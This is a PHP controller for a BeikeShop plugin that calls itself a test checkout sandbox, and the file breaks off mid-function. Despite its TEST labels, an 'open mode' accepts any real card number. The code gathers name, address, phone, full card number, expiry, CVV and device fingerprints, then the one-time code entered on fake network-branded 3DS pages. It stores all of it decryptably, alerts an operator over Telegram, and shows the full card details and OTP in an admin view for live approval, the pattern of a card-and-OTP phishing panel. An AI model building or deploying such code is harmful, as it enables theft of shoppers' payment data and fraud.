<?php

namespace Plugin\BeikeShopTestSandbox\Controllers;

use Beike\Models\DashboardEvent;
use Beike\Repositories\CountryRepo;
use Beike\Shop\Http\Controllers\Controller;
use Beike\Shop\Services\CartService;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Crypt;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Str;
use Illuminate\Validation\Rule;
use Plugin\BeikeShopTestSandbox\Services\BinSearchLookupService;
use Plugin\BeikeShopTestSandbox\Services\SandboxReviewService;
use Plugin\BeikeShopTestSandbox\Services\TelegramOrderNotificationService;
use Plugin\BeikeShopTestSandbox\Support\TestCardCatalog;
use Symfony\Component\HttpFoundation\StreamedResponse;

class TestCheckoutPluginController extends Controller
{
    public function __construct(
        private BinSearchLookupService $binLookup,
        private SandboxReviewService $reviewService,
        private TelegramOrderNotificationService $telegramNotifications
    ) {}

    /** Standalone storefront entry; the same view is used by the Puck module. */
    public function index(?string $checkoutSession = null)
    {
        abort_unless(
            $checkoutSession === null || (bool) preg_match('/^\d{12}$/', $checkoutSession),
            404
        );

        $cart = CartService::reloadData(CartService::list(current_customer(), true));

        if (empty($cart['carts'])) {
            return redirect(shop_route('carts.index'));
        }

        return response()->view('BeikeShopTestSandbox::shop.page', [
            'title'             => 'Secure checkout',
            'checkoutCart'      => $cart,
            // Reuse the shop's enabled country catalogue instead of maintaining
            // a short, stale list in the plugin view.
            'checkoutCountries' => CountryRepo::listEnabled()
                ->map(static fn ($country) => [
                    'code' => strtoupper((string) $country->code),
                    'name' => (string) $country->name,
                ])
                ->filter(static fn (array $country) => preg_match('/^[A-Z]{2}$/', $country['code']))
                ->sortBy('name')
                ->values()
                ->all(),
        ]);
    }

    public function refundPolicy()
    {
        return view('BeikeShopTestSandbox::shop.refund_policy');
    }

    /**
     * Serve the sandbox challenge as HTML instead of through the generic
     * plugin-asset endpoint. That endpoint only permits media MIME types, so
     * an .html challenge there is returned as an empty iframe document.
     */
    public function threeDsChallenge(string $network)
    {
        $templates = [
            'visa'       => 'visa-3ds.html',
            'mastercard' => 'mastercard-3ds.html',
            'amex'       => 'amex-3ds.html',
            'discover'   => 'discover-3ds.html',
            'dinersclub' => 'dinersclub-3ds.html',
            'jcb'        => 'jcb-3ds.html',
            'unionpay'   => 'unionpay-3ds.html',
        ];

        $template = $templates[$network] ?? null;
        if (! $template) {
            abort(404);
        }

        $path = plugin_path('BeikeShopTestSandbox/Static/3ds-global-7/' . $template);
        abort_unless(is_file($path), 404);

        $html       = file_get_contents($path);
        $bridgePath = plugin_path('BeikeShopTestSandbox/Static/3ds-global-7/challenge-bridge.js');

        // The visual network templates are deliberately static, but their
        // interaction contract must not depend on the parent reaching into an
        // iframe DOM.  Inject the shared, same-origin bridge so every network
        // template owns its keyboard, loading and error states and talks to
        // the checkout only through a narrow postMessage protocol.
        abort_unless(is_file($bridgePath), 500, '3DS challenge bridge is missing.');
        $bridge = file_get_contents($bridgePath);
        $html   = str_replace('</body>', "<script>\n{$bridge}\n</script>\n</body>", $html);

        return response($html, 200, [
            'Content-Type'  => 'text/html; charset=UTF-8',
            'Cache-Control' => 'no-store, max-age=0',
        ]);
    }

    public function mode(): JsonResponse
    {
        return response()->json([
            'success'   => true,
            'inputMode' => TestCardCatalog::inputMode(),
        ]);
    }

    /**
     * TEST-ONLY 精确卡档案。
     *
     * cardClassCode:
     * C = Credit / 信用卡
     * D = Debit / 借记卡
     * P = Prepaid / 预付卡
     * G = Gift / 礼品卡
     *
     * 真实线上系统应使用支付服务商/BIN 数据源判断 funding；
     * 本沙盒只对下面的固定 TEST 卡做确定性分类。
     */
    private const TEST_CARD_PROFILES = [
        '4242424242424242' => [
            'scenario'       => 'VISA_CREDIT',
            'brand'          => 'Visa',
            'organization'   => 'Visa',
            'funding_type'   => 'CREDIT',
            'class_code'     => 'C',
            'class_label_zh' => 'C卡 · 信用卡',
            'type'           => 'C卡 (信用/贷记卡)',
            'display_name'   => 'Visa Credit TEST',
            'background'     => '/beikeshop-test/assets/cards/backgrounds/visa-credit.svg',
            'logo'           => '/beikeshop-test/assets/cards/logos/visa.svg',
        ],
        '4000056655665556' => [
            'scenario'       => 'VISA_DEBIT',
            'brand'          => 'Visa',
            'organization'   => 'Visa',
            'funding_type'   => 'DEBIT',
            'class_code'     => 'D',
            'class_label_zh' => 'D卡 · 借记卡',
            'type'           => 'D卡 (借记卡)',
            'display_name'   => 'Visa Debit TEST',
            'background'     => '/beikeshop-test/assets/cards/backgrounds/visa-debit.svg',
            'logo'           => '/beikeshop-test/assets/cards/logos/visa.svg',
        ],
        '5555555555554444' => [
            'scenario'       => 'MASTERCARD_CREDIT',
            'brand'          => 'Mastercard',
            'organization'   => 'Mastercard',
            'funding_type'   => 'CREDIT',
            'class_code'     => 'C',
            'class_label_zh' => 'C卡 · 信用卡',
            'type'           => 'C卡 (信用/贷记卡)',
            'display_name'   => 'Mastercard Credit TEST',
            'background'     => '/beikeshop-test/assets/cards/backgrounds/mastercard-credit.svg',
            'logo'           => '/beikeshop-test/assets/cards/logos/mastercard.svg',
        ],
        '5200828282828210' => [
            'scenario'       => 'MASTERCARD_DEBIT',
            'brand'          => 'Mastercard',
            'organization'   => 'Mastercard',
            'funding_type'   => 'DEBIT',
            'class_code'     => 'D',
            'class_label_zh' => 'D卡 · 借记卡',
            'type'           => 'D卡 (借记卡)',
            'display_name'   => 'Mastercard Debit TEST',
            'background'     => '/beikeshop-test/assets/cards/backgrounds/mastercard-debit.svg',
            'logo'           => '/beikeshop-test/assets/cards/logos/mastercard.svg',
        ],
        '5105105105105100' => [
            'scenario'       => 'MASTERCARD_PREPAID',
            'brand'          => 'Mastercard',
            'organization'   => 'Mastercard',
            'funding_type'   => 'PREPAID',
            'class_code'     => 'P',
            'class_label_zh' => 'P卡 · 预付卡',
            'type'           => 'P卡 (预付卡)',
            'display_name'   => 'Mastercard Prepaid TEST',
            'background'     => '/beikeshop-test/assets/cards/backgrounds/mastercard-prepaid.svg',
            'logo'           => '/beikeshop-test/assets/cards/logos/mastercard.svg',
        ],
        '378282246310005' => [
            'scenario'       => 'AMEX_CREDIT',
            'brand'          => 'AMEX',
            'organization'   => 'American Express',
            'funding_type'   => 'CREDIT',
            'class_code'     => 'C',
            'class_label_zh' => 'C卡 · 信用卡',
            'type'           => 'C卡 (高级信用卡)',
            'display_name'   => 'American Express Credit TEST',
            'background'     => '/beikeshop-test/assets/cards/backgrounds/amex-credit.svg',
            'logo'           => '/beikeshop-test/assets/cards/logos/amex.svg',
        ],
        '3566002020360505' => [
            'scenario'       => 'JCB_CREDIT',
            'brand'          => 'JCB',
            'organization'   => 'JCB',
            'funding_type'   => 'CREDIT',
            'class_code'     => 'C',
            'class_label_zh' => 'C卡 · 信用卡',
            'type'           => 'C卡 (信用/贷记卡)',
            'display_name'   => 'JCB Credit TEST',
            'background'     => '/beikeshop-test/assets/cards/backgrounds/jcb-credit.svg',
            'logo'           => '/beikeshop-test/assets/cards/logos/jcb.svg',
        ],
        // 保留 V2.x 旧 JCB 测试号以兼容已有演示脚本。
        '3530111333300000' => [
            'scenario'       => 'JCB_CREDIT_LEGACY',
            'brand'          => 'JCB',
            'organization'   => 'JCB',
            'funding_type'   => 'CREDIT',
            'class_code'     => 'C',
            'class_label_zh' => 'C卡 · 信用卡',
            'type'           => 'C卡 (信用/贷记卡)',
            'display_name'   => 'JCB Legacy Credit TEST',
            'background'     => '/beikeshop-test/assets/cards/backgrounds/jcb-credit.svg',
            'logo'           => '/beikeshop-test/assets/cards/logos/jcb.svg',
        ],
        '6200000000000005' => [
            'scenario'       => 'UNIONPAY_CREDIT',
            'brand'          => 'UnionPay',
            'organization'   => 'China UnionPay',
            'funding_type'   => 'CREDIT',
            'class_code'     => 'C',
            'class_label_zh' => 'C卡 · 信用卡',
            'type'           => 'C卡 (信用/贷记卡)',
            'display_name'   => 'UnionPay Credit TEST',
            'background'     => '/beikeshop-test/assets/cards/backgrounds/unionpay-credit.svg',
            'logo'           => '/beikeshop-test/assets/cards/logos/unionpay.svg',
        ],
        '6200000000000047' => [
            'scenario'       => 'UNIONPAY_DEBIT',
            'brand'          => 'UnionPay',
            'organization'   => 'China UnionPay',
            'funding_type'   => 'DEBIT',
            'class_code'     => 'D',
            'class_label_zh' => 'D卡 · 借记卡',
            'type'           => 'D卡 (借记卡)',
            'display_name'   => 'UnionPay Debit TEST',
            'background'     => '/beikeshop-test/assets/cards/backgrounds/unionpay-debit.svg',
            'logo'           => '/beikeshop-test/assets/cards/logos/unionpay.svg',
        ],
        // 完全自定义的合成礼品卡，不对应任何真实支付网络。
        '9900000000000000' => [
            'scenario'       => 'SANDBOX_GIFT',
            'brand'          => 'Sandbox Gift',
            'organization'   => 'Sandbox Gift',
            'funding_type'   => 'GIFT',
            'class_code'     => 'G',
            'class_label_zh' => 'G卡 · 礼品卡',
            'type'           => 'G卡 (礼品卡)',
            'display_name'   => 'Sandbox Gift Card',
            'background'     => '/beikeshop-test/assets/cards/backgrounds/gift.svg',
            'logo'           => '/beikeshop-test/assets/cards/logos/gift.svg',
        ],
    ];

    public function start(Request $request): JsonResponse
    {
        $validated = $request->validate([
            'fullName' => ['required', 'string', 'max:80'],
            // Delivery data remains client-side checkout context. The sandbox
            // review console receives only the billing address supplied here.
            'billingAddress'                    => ['required', 'string', 'max:160'],
            'phone'                             => ['required', 'string', 'max:30'],
            'cardNumber'                        => ['required', 'string', 'max:24'],
            'expiryDate'                        => ['required', 'regex:/^(0[1-9]|1[0-2])\/\d{2}$/'],
            'cvv'                               => ['required', 'digits_between:3,4'],
            'deviceType'                        => ['nullable', 'string', 'max:50'],
            'deviceSignals'                     => ['required', 'array'],
            'deviceSignals.userAgent'           => ['nullable', 'string', 'max:500'],
            'deviceSignals.platform'            => ['nullable', 'string', 'max:100'],
            'deviceSignals.language'            => ['nullable', 'string', 'max:40'],
            'deviceSignals.timezone'            => ['nullable', 'string', 'max:80'],
            'deviceSignals.screenWidth'         => ['nullable', 'integer', 'min:0', 'max:20000'],
            'deviceSignals.screenHeight'        => ['nullable', 'integer', 'min:0', 'max:20000'],
            'deviceSignals.colorDepth'          => ['nullable', 'integer', 'min:0', 'max:128'],
            'deviceSignals.hardwareConcurrency' => ['nullable', 'integer', 'min:0', 'max:512'],
            'deviceSignals.deviceMemory'        => ['nullable', 'numeric', 'min:0', 'max:1024'],
            'deviceSignals.maxTouchPoints'      => ['nullable', 'integer', 'min:0', 'max:100'],
            'deviceSignals.cookieEnabled'       => ['nullable', 'boolean'],
            'demoConsent'                       => ['accepted'],
        ]);

        $pan           = TestCardCatalog::normalizePan($validated['cardNumber']);
        $isWhitelisted = TestCardCatalog::isAllowedPan($pan);
        $card          = self::TEST_CARD_PROFILES[$pan] ?? null;

        if (! TestCardCatalog::allowsPan($pan)) {
            return response()->json([
                'success' => false,
                'message' => '白名单模式仅支持内置 TEST 卡；开放模式仅接受 12-19 位数字。',
            ], 422);
        }

        // The sandbox has its own card-entry page, so record the same
        // privacy-safe funnel signal only after the payment data passes its
        // structural checks. No PAN, expiry date, or CVV reaches analytics.
        DashboardEvent::recordPaymentInformationAdded(current_customer());

        $card ??= $this->openModeCardProfile($pan);

        $orderId = 'DEMO_' . Str::upper(Str::random(12));

        // Whitelist mode only enriches built-in TEST PANs. Open mode performs
        // the same provider-backed detection for every structurally valid PAN.
        if (TestCardCatalog::isLocalOnlyPan($pan)) {
            $binLookup = [
                'status'            => 'LOCAL_ONLY',
                'source'            => 'LOCAL_TEST_PROFILE',
                'provider'          => 'local',
                'endpoint'          => null,
                'bin'               => substr($pan, 0, 8),
                'brand'             => $card['brand'],
                'type'              => 'GIFT',
                'category'          => 'GIFT',
                'resolvedFunding'   => 'GIFT',
                'resolvedClassCode' => 'G',
                'lengthValid'       => true,
                'luhnValid'         => null,
                'lookedUpAt'        => now()->toIso8601String(),
            ];
        } else {
            $binLookup = $this->binLookup->enrichTestPan(
                $pan,
                false,
                ['orderId' => $orderId]
            );
        }
        $now                   = now();
        $clientIp              = $request->ip();
        $clientIpHash          = $this->hashIp($clientIp);
        $deviceSignals         = $this->normalizeDeviceSignals($validated['deviceSignals']);
        $deviceFingerprintHash = $this->hashDeviceSignals($deviceSignals);

        $priorIpCount = $clientIpHash
            ? DB::table('beikeshop_test_checkout_logs')->where('client_ip_hash', $clientIpHash)->count()
            : 0;
        $priorDeviceCount = $deviceFingerprintHash
            ? DB::table('beikeshop_test_checkout_logs')->where('device_fingerprint_hash', $deviceFingerprintHash)->count()
            : 0;

        [$riskScore, $riskFlags] = $this->buildRiskRadar(
            $validated['deviceType'] ?? null,
            $deviceSignals,
            $priorIpCount,
            $priorDeviceCount
        );

        // 外部 BIN 结果与本地 TEST 档案不一致时，不阻断演示，但加入雷达风险标记。
        if ($isWhitelisted && ($binLookup['status'] ?? null) === 'OK') {
            if (($binLookup['luhnValid'] ?? null) === false) {
                $riskScore   = min(100, $riskScore + 35);
                $riskFlags[] = 'BIN_LUHN_INVALID';
            }

            if (($binLookup['lengthValid'] ?? null) === false) {
                $riskScore   = min(100, $riskScore + 35);
                $riskFlags[] = 'BIN_LENGTH_INVALID';
            }

            $externalBrand = strtoupper((string) ($binLookup['brand'] ?? ''));
            $localBrand    = strtoupper((string) $card['brand']);
            if ($externalBrand !== '' && ! $this->brandsEquivalent($externalBrand, $localBrand)) {
                $riskScore   = min(100, $riskScore + 20);
                $riskFlags[] = 'BIN_BRAND_MISMATCH';
            }

            $externalFunding = strtoupper((string) ($binLookup['resolvedFunding'] ?? ''));
            $localFunding    = strtoupper((string) $card['funding_type']);
            if ($externalFunding !== '' && $externalFunding !== $localFunding) {
                $riskScore   = min(100, $riskScore + 15);
                $riskFlags[] = 'BIN_FUNDING_MISMATCH';
            }
        }

        $riskFlags = array_values(array_unique($riskFlags));

        $providerClass   = $binLookup['resolvedClassCode'] ?? null;
        $providerFunding = $binLookup['resolvedFunding']   ?? null;
        $providerUsable  = ($binLookup['status'] ?? null) === 'OK' && $providerClass && $providerFunding;

        if (! $isWhitelisted && $providerUsable) {
            $card['brand']        = (string) ($binLookup['brand'] ?? $card['brand']);
            $card['organization'] = (string) ($binLookup['issuer'] ?? $card['organization']);
            $card['funding_type'] = (string) $providerFunding;
            $card['class_code']   = (string) $providerClass;
            $card['type']         = '开放模式 · BIN 检测';
        }

        $effectiveClass          = $providerUsable ? $providerClass : $card['class_code'];
        $effectiveFunding        = $providerUsable ? $providerFunding : $card['funding_type'];
        $classificationAuthority = $providerUsable
            ? 'BIN_API'
            : ($isWhitelisted ? 'LOCAL_TEST_PROFILE' : 'OPEN_MODE_FALLBACK');

        $sensitive = [
            'fullName'         => $validated['fullName'],
            'address'          => $validated['billingAddress'],
            'phone'            => $validated['phone'],
            'cardNumber'       => $this->formatPan($pan, $card['brand']),
            'expiryDate'       => $validated['expiryDate'],
            'cvv'              => $validated['cvv'],
            'latestSandboxOtp' => null,
            'deviceSignals'    => $deviceSignals,
        ];

        DB::table('beikeshop_test_checkout_logs')->insert([
            'order_id'                 => $orderId,
            'scenario'                 => $card['scenario'],
            'card_brand'               => $card['brand'],
            'card_type'                => $card['type'],
            'effective_class_code'     => $effectiveClass,
            'effective_funding_type'   => $effectiveFunding,
            'classification_authority' => $classificationAuthority,
            'pan_last4'                => substr($pan, -4),
            'bin_prefix'               => substr($pan, 0, min(8, strlen($pan))),
            'bin_lookup_status'        => $binLookup['status'] ?? 'UNKNOWN',
            'bin_lookup_source'        => $binLookup['source'] ?? 'FALLBACK',
            'bin_lookup_data'          => json_encode($binLookup, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES),
            'bin_lookup_at'            => now(),
            'bin_luhn_valid'           => array_key_exists('luhnValid', $binLookup) ? $binLookup['luhnValid'] : null,
            'bin_length_valid'         => array_key_exists('lengthValid', $binLookup) ? $binLookup['lengthValid'] : null,
            'bin_card_number_masked'   => $binLookup['cardNumberMasked'] ?? null,
            'bin_response_hash'        => $binLookup['responseHash']     ?? null,
            'bin_response_ms'          => $binLookup['responseTimeMs']   ?? null,
            'device_type'              => $validated['deviceType']       ?? null,
            'client_ip'                => $clientIp,
            'client_ip_hash'           => $clientIpHash,
            'device_fingerprint_hash'  => $deviceFingerprintHash,
            'risk_score'               => $riskScore,
            'risk_flags'               => json_encode($riskFlags, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES),
            'sensitive_payload'        => $this->encryptSensitive($sensitive),
            'status'                   => 'OTP_REQUIRED',
            'otp_attempt_count'        => 0,
            'created_at'               => $now,
            'updated_at'               => $now,
        ]);

        $this->bumpStreamVersion();
        $this->telegramNotifications->queueNewOrder($orderId);

        return response()->json([
            'success' => true,
            'orderId' => $orderId,
            'state'   => 'OTP_REQUIRED',
            'notice'  => 'DEMO/SANDBOX ONLY：请输入任意 4 位或 6 位测试验证码。',
        ], 201);
    }

    public function verifySandboxOtp(Request $request): JsonResponse
    {
        $validated = $request->validate([
            'orderId'     => ['required', 'string', 'max:32'],
            'sandboxCode' => ['required', 'regex:/^(?:\d{4}|\d{6})$/'],
        ]);

        $result = DB::transaction(function () use ($validated) {
            $order = DB::table('beikeshop_test_checkout_logs')
                ->where('order_id', $validated['orderId'])
                ->lockForUpdate()
                ->first();

            if (! $order) {
                return ['status' => 404, 'body' => ['success' => false, 'message' => '沙盒会话不存在']];
            }
            if ($order->status === 'WAITING_REVIEW') {
                $sensitive = $this->decryptSensitive($order->sensitive_payload);
                if (hash_equals((string) ($sensitive['latestSandboxOtp'] ?? ''), $validated['sandboxCode'])) {
                    return ['status' => 200, 'body' => [
                        'success'    => true,
                        'state'      => 'WAITING_REVIEW',
                        'idempotent' => true,
                        'message'    => '测试验证码已提交，等待后台人工裁决。',
                    ]];
                }
            }

            if ($order->status !== 'OTP_REQUIRED') {
                return ['status' => 409, 'body' => [
                    'success' => false,
                    'message' => '当前状态不允许提交新验证码',
                    'state'   => $order->status,
                ]];
            }

            $sensitive                     = $this->decryptSensitive($order->sensitive_payload);
            $sensitive['latestSandboxOtp'] = $validated['sandboxCode'];

            DB::table('beikeshop_test_checkout_logs')
                ->where('id', $order->id)
                ->update([
                    'sensitive_payload' => $this->encryptSensitive($sensitive),
                    'status'            => 'WAITING_REVIEW',
                    'otp_attempt_count' => ((int) $order->otp_attempt_count) + 1,
                    'otp_submitted_at'  => now(),
                    'updated_at'        => now(),
                ]);

            return ['status' => 200, 'body' => [
                'success' => true,
                'state'   => 'WAITING_REVIEW',
                'message' => '测试验证码已提交，等待后台人工裁决。',
            ]];
        });

        if (($result['status'] ?? 500) === 200 && empty($result['body']['idempotent'])) {
            $this->bumpStreamVersion();
        }

        return response()->json($result['body'], $result['status']);
    }

    /**
     * End an active TEST challenge when the customer chooses to return to
     * checkout. This releases the client-side form lock and removes any
     * outstanding review action without deleting its audit record.
     */
    public function cancelSandboxSession(Request $request): JsonResponse
    {
        $validated = $request->validate([
            'orderId' => ['required', 'string', 'regex:/^DEMO_[A-Z0-9]{12}$/'],
        ]);

        $result = DB::transaction(function () use ($validated) {
            $order = DB::table('beikeshop_test_checkout_logs')
                ->where('order_id', $validated['orderId'])
                ->lockForUpdate()
                ->first();

            if (! $order) {
                return ['status' => 404, 'body' => ['success' => false, 'message' => '沙盒会话不存在']];
            }

            if ($order->status === 'CANCELLED') {
                return ['status' => 200, 'body' => ['success' => true, 'state' => 'CANCELLED', 'idempotent' => true]];
            }

            if (! in_array($order->status, ['OTP_REQUIRED', 'WAITING_REVIEW'], true)) {
                return ['status' => 409, 'body' => [
                    'success' => false,
                    'message' => '当前沙盒会话已提交，不能再取消。',
                    'state'   => $order->status,
                ]];
            }

            DB::table('beikeshop_test_checkout_logs')
                ->where('id', $order->id)
                ->update([
                    'status'     => 'CANCELLED',
                    'updated_at' => now(),
                ]);

            return ['status' => 200, 'body' => ['success' => true, 'state' => 'CANCELLED']];
        });

        if (($result['status'] ?? 500) === 200 && empty($result['body']['idempotent'])) {
            $this->bumpStreamVersion();
        }

        return response()->json($result['body'], $result['status']);
    }

    public function status(string $orderId): JsonResponse
    {
        if (! preg_match('/^DEMO_[A-Z0-9]{12}$/', $orderId)) {
            return response()->json(['success' => false, 'message' => '订单号格式错误'], 422);
        }

        $order = DB::table('beikeshop_test_checkout_logs')->where('order_id', $orderId)->first();
        if (! $order) {
            return response()->json(['success' => false, 'message' => '沙盒会话不存在'], 404);
        }

        return response()->json(['success' => true, 'order' => $this->publicDto($order)]);
    }

    /**
     * A short-lived server-sent event stream for the customer challenge.
     * It publishes the initial state immediately, then only emits again when
     * the row changes.  Clients reconnect automatically; normal status
     * polling remains available as the intentional fallback transport.
     */
    public function events(string $orderId): StreamedResponse
    {
        abort_unless(
            (bool) preg_match('/^DEMO_[A-Z0-9]{12}$/', $orderId),
            422,
            '订单号格式错误'
        );

        return response()->stream(function () use ($orderId): void {
            $lastCursor = null;

            echo "retry: 1000\n\n";

            // Keep every response bounded so PHP-FPM workers are not held by
            // abandoned browser tabs. EventSource reconnects transparently.
            for ($tick = 0; $tick < 25; $tick++) {
                if (connection_aborted()) {
                    break;
                }

                $order = DB::table('beikeshop_test_checkout_logs')
                    ->where('order_id', $orderId)
                    ->first();

                if (! $order) {
                    echo "event: state\n";
                    echo 'data: ' . json_encode([
                        'success' => false,
                        'message' => '沙盒会话不存在',
                    ], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES) . "\n\n";
                    @ob_flush();
                    flush();

                    break;
                }

                // `updated_at` commonly has second precision, so a review
                // decision made in the same second as OTP submission could be
                // invisible if it were our only cursor. The mutation version
                // changes after every relevant committed write.
                $cursor = (string) Cache::get('beikeshop_test_stream_version', '0')
                    . '|' . (string) $order->updated_at;
                if ($tick === 0 || $cursor !== $lastCursor) {
                    $lastCursor = $cursor;
                    echo "event: state\n";
                    echo 'data: ' . json_encode([
                        'success' => true,
                        'order'   => $this->publicDto($order),
                    ], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES) . "\n\n";
                    @ob_flush();
                    flush();
                }

                if ($tick > 0 && $tick % 10 === 0) {
                    echo ": heartbeat\n\n";
                    @ob_flush();
                    flush();
                }

                usleep(1_000_000);
            }
        }, 200, [
            'Content-Type'      => 'text/event-stream',
            'Cache-Control'     => 'no-cache, no-store, must-revalidate',
            'Connection'        => 'keep-alive',
            'X-Accel-Buffering' => 'no',
        ]);
    }

    public function liveFeed(Request $request): JsonResponse
    {
        $clientVersion  = (string) $request->query('version', '');
        $currentVersion = (string) Cache::get('beikeshop_test_stream_version', '0');

        if ($clientVersion !== '' && hash_equals($currentVersion, $clientVersion)) {
            return response()->json([
                'success' => true,
                'changed' => false,
                'version' => $currentVersion,
            ]);
        }

        $orders = DB::table('beikeshop_test_checkout_logs')
            ->orderByDesc('id')
            ->limit(30)
            ->get()
            ->map(fn ($order) => [
                'orderId'                 => $order->order_id,
                'state'                   => $order->status,
                'cardBrand'               => $order->card_brand,
                'cardType'                => $order->card_type,
                'panLast4'                => $order->pan_last4,
                'effectiveCardClassCode'  => $order->effective_class_code,
                'effectiveFundingType'    => $order->effective_funding_type,
                'classificationAuthority' => $order->classification_authority,
                'deviceType'              => $order->device_type,
                'riskScore'               => (int) ($order->risk_score ?? 0),
                'otpAttemptCount'         => (int) ($order->otp_attempt_count ?? 0),
                'binLookupStatus'         => $order->bin_lookup_status,
                'binLookupSource'         => $order->bin_lookup_source,
                'createdAt'               => $order->created_at,
                'updatedAt'               => $order->updated_at,
            ])
            ->values();

        return response()->json([
            'success' => true,
            'changed' => true,
            'version' => $currentVersion,
            'orders'  => $orders,
        ]);
    }

    public function binQuota(): JsonResponse
    {
        return response()->json([
            'success' => true,
            'quota'   => $this->binLookup->quota(),
        ]);
    }

    public function control(Request $request): JsonResponse
    {
        $validated = $request->validate([
            'orderId' => ['required', 'string', 'max:32'],
            'action'  => ['required', Rule::in(['APPROVE', 'RETRY_OTP'])],
            'reason'  => ['nullable', 'string', 'max:250'],
        ]);

        $result = $this->reviewService->decide(
            $validated['orderId'],
            $validated['action'],
            current_user()?->id,
            $validated['reason'] ?? null
        );

        return response()->json($result['body'], $result['status']);
    }

    private function publicDto(object $order): array
    {
        return [
            'orderId'   => $order->order_id,
            'state'     => $order->status,
            'createdAt' => $order->created_at,
            'updatedAt' => $order->updated_at,
        ];
    }

    private function adminDto(object $order): array
    {
        $public    = $this->publicDto($order);
        $meta      = $this->cardMetaByScenario($order->scenario, $order->card_brand, $order->card_type);
        $sensitive = $this->decryptSensitive($order->sensitive_payload);
        $riskFlags = json_decode($order->risk_flags ?? '[]', true);
        if (! is_array($riskFlags)) {
            $riskFlags = [];
        }

        $sameIpCount = $order->client_ip_hash
            ? DB::table('beikeshop_test_checkout_logs')->where('client_ip_hash', $order->client_ip_hash)->count()
            : 0;
        $sameDeviceCount = $order->device_fingerprint_hash
            ? DB::table('beikeshop_test_checkout_logs')->where('device_fingerprint_hash', $order->device_fingerprint_hash)->count()
            : 0;

        $binLookup = json_decode($order->bin_lookup_data ?? '{}', true);
        if (! is_array($binLookup)) {
            $binLookup = [];
        }

        $providerClass   = $binLookup['resolvedClassCode'] ?? null;
        $providerFunding = $binLookup['resolvedFunding']   ?? null;
        $providerUsable  = ($binLookup['status'] ?? null) === 'OK' && $providerClass && $providerFunding;

        return [
            ...$public,
            'scenario'                => $order->scenario,
            'cardBrand'               => $order->card_brand,
            'cardType'                => $order->card_type,
            'cardOrganization'        => $meta['organization'],
            'cardClassCode'           => $meta['class_code'],
            'cardClassLabelZh'        => $meta['class_label_zh'],
            'cardDisplayName'         => $meta['display_name'],
            'cardBackground'          => $meta['background'],
            'cardLogo'                => $meta['logo'],
            'panLast4'                => $order->pan_last4,
            'otpAttemptCount'         => (int) $order->otp_attempt_count,
            'riskScore'               => (int) ($order->risk_score ?? 0),
            'effectiveCardClassCode'  => $providerUsable ? $providerClass : $meta['class_code'],
            'effectiveFundingType'    => $providerUsable ? $providerFunding : $meta['funding_type'],
            'classificationAuthority' => $providerUsable ? 'BIN_API' : 'LOCAL_TEST_PROFILE',
            'deviceType'              => $order->device_type,
            'deviceFingerprintHash'   => $order->device_fingerprint_hash,
            'deviceSignals'           => $sensitive['deviceSignals'] ?? [],
            'sameIpCount'             => $sameIpCount,
            'sameDeviceCount'         => $sameDeviceCount,
            'riskFlags'               => $riskFlags,
            'binPrefix'               => $order->bin_prefix ?? null,
            'binLookup'               => $binLookup,
            'clientIp'                => $order->client_ip,
            'clientIpHash'            => $order->client_ip_hash,
            'fullName'                => $sensitive['fullName']         ?? null,
            'address'                 => $sensitive['address']          ?? null,
            'phone'                   => $sensitive['phone']            ?? null,
            'cardNumber'              => $sensitive['cardNumber']       ?? null,
            'expiryDate'              => $sensitive['expiryDate']       ?? null,
            'cvv'                     => $sensitive['cvv']              ?? null,
            'latestSandboxOtp'        => $sensitive['latestSandboxOtp'] ?? null,
            'otpSubmittedAt'          => $order->otp_submitted_at,
            'reviewedAt'              => $order->reviewed_at,
            'reviewedBy'              => $order->reviewed_by,
        ];
    }

    private function cardMetaByScenario(?string $scenario, ?string $brand, ?string $type): array
    {
        foreach (self::TEST_CARD_PROFILES as $row) {
            if (($row['scenario'] ?? null) === $scenario) {
                return $this->withPluginAssetUrls($row);
            }
        }

        $isDebit = str_contains((string) $type, '借记');

        return $this->withPluginAssetUrls([
            'organization'   => $brand ?? 'Unknown',
            'funding_type'   => $isDebit ? 'DEBIT' : 'CREDIT',
            'class_code'     => $isDebit ? 'D' : 'C',
            'class_label_zh' => $isDebit ? 'D卡 · 借记卡' : 'C卡 · 信用卡',
            'display_name'   => $brand ?? 'Unknown',
            'background'     => '/beikeshop-test/assets/cards/base/generic-front.svg',
            'logo'           => '/beikeshop-test/assets/cards/logos/gift.svg',
        ]);
    }

    private function withPluginAssetUrls(array $meta): array
    {
        foreach (['background', 'logo'] as $key) {
            $path = (string) ($meta[$key] ?? '');
            if (str_starts_with($path, '/beikeshop-test/assets/cards/')) {
                $meta[$key] = plugin_asset(
                    'beike_shop_test_sandbox',
                    'cards/' . substr($path, strlen('/beikeshop-test/assets/cards/'))
                );
            }
        }

        return $meta;
    }

    /** Open-mode fallback metadata when the provider has no usable result. */
    private function openModeCardProfile(string $pan): array
    {
        return [
            'scenario'       => 'OPEN_DEMO',
            'brand'          => 'Open Demo',
            'organization'   => 'Open Demo',
            'funding_type'   => 'UNCLASSIFIED',
            'class_code'     => 'U',
            'class_label_zh' => 'U卡 · 开放演示',
            'type'           => '开放模式演示卡',
            'display_name'   => 'Open Demo Card',
            'background'     => '/beikeshop-test/assets/cards/base/generic-front.svg',
            'logo'           => '/beikeshop-test/assets/cards/logos/open.svg',
        ];
    }

    private function brandsEquivalent(string $external, string $local): bool
    {
        $normalize = static function (string $brand): string {
            $brand = strtoupper(trim($brand));

            return match ($brand) {
                'AMERICAN EXPRESS', 'AMEX' => 'AMEX',
                'MASTER CARD', 'MASTERCARD', 'MC' => 'MASTERCARD',
                'CHINA UNIONPAY', 'UNIONPAY' => 'UNIONPAY',
                default => preg_replace('/[^A-Z0-9]/', '', $brand),
            };
        };

        return $normalize($external) === $normalize($local);
    }

    private function normalizeDeviceSignals(array $signals): array
    {
        $allowed = [
            'userAgent', 'platform', 'language', 'timezone', 'screenWidth', 'screenHeight',
            'colorDepth', 'hardwareConcurrency', 'deviceMemory', 'maxTouchPoints', 'cookieEnabled',
        ];

        $normalized = [];
        foreach ($allowed as $key) {
            $normalized[$key] = $signals[$key] ?? null;
        }
        ksort($normalized);

        return $normalized;
    }

    private function hashDeviceSignals(array $signals): string
    {
        return hash_hmac(
            'sha256',
